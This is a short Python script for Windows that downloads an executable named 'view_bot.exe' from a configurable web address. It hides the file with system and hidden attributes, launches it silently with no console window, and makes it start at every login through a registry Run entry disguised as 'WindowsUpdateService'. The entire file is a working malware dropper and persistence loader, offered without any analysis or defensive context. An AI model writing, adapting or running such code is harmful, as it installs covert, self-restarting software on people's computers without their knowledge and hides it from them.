import requests
import subprocess
import os
import winreg
import sys

# Configurable: URL to hosted view_bot.exe
EXECUTABLE_URL = 'http://yourwebsite.com/path/to/view_bot.exe'

def download_exe():
    try:
        response = requests.get(EXECUTABLE_URL, stream=True)
        response.raise_for_status()
        exe_path = os.path.join(os.getcwd(), 'view_bot.exe')
        with open(exe_path, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        return exe_path
    except Exception as e:
        print(f"Download failed: {e}")
        return None

def hide_file(file_path):
    try:
        # +h (hidden) +s (system)
        subprocess.run(['attrib', '+h', '+s', file_path], check=True, creationflags=subprocess.CREATE_NO_WINDOW)
    except:
        pass

def run_silent(file_path):
    # Run hidden, no console
    subprocess.Popen([file_path], creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS)

def add_to_startup(file_path):
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WindowsUpdateService", 0, winreg.REG_SZ, file_path)  # Disguised name
        winreg.CloseKey(key)
    except Exception as e:
        print(f"Startup registry failed: {e}")

if __name__ == "__main__":
    exe_path = download_exe()
    if exe_path and os.path.exists(exe_path):
        hide_file(exe_path)
        run_silent(exe_path)
        add_to_startup(exe_path)
        sys.exit(0)
    else:
        sys.exit(1)

